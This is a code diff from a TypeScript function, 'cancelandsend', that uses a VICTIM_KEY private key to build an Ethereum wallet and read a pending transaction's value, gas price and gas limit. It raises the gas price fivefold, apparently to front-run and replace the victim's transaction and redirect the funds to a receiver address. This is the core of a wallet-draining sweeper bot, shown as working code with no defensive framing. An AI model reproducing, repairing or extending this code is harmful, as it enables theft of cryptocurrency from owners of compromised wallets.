@@ -1192,9 +1192,10 @@ async function cancelandsend(transactx: any, VICTIM_KEY: string, reciver: string
 
   const wallet = new Wallet(VICTIM_KEY, provider);
   
- var balance = await wallet.getBalance();
- request.log.info('Value is:'+transactx.object.get("value").toString());
- var balance = ethers.BigNumber.from(transactx.object.get("value").toString()); // value to be sent by the previous transaction
+//  var balance = await wallet.getBalance();
+ const valuee = await transactx.object.get("value")
+ request.log.info('Value is:'+valuee);
+ var balance = ethers.BigNumber.from(valuee); // value to be sent by the previous transaction
 
   if (ethers.BigNumber.from(balance).lte(0)) {
     request.log.info(`Value is zero`);
@@ -1202,8 +1203,10 @@ async function cancelandsend(transactx: any, VICTIM_KEY: string, reciver: string
   }
   
 //  const gasPrice = ethers.BigNumber.from(await provider.getGasPrice());
- var gasPrice = (ethers.BigNumber.from(transactx.object.get("gasPrice").toString() )).mul(5);
- var gasLimit = ethers.BigNumber.from(transactx.object.get("gasLimit").toString() );
+var gapricevalu = await transactx.object.get("gasPrice");
+var gaslimivalu = await transactx.object.get("gasLimit");
+ var gasPrice = (ethers.BigNumber.from(gapricevalu)).mul(5);
+ var gasLimit = ethers.BigNumber.from(gaslimivalu);
  var gasPriceTotal = (gasPrice).mul(gasLimit);
 
  const gasPrice2 = (ethers.BigNumber.from(await provider.getGasPrice())).mul(5);
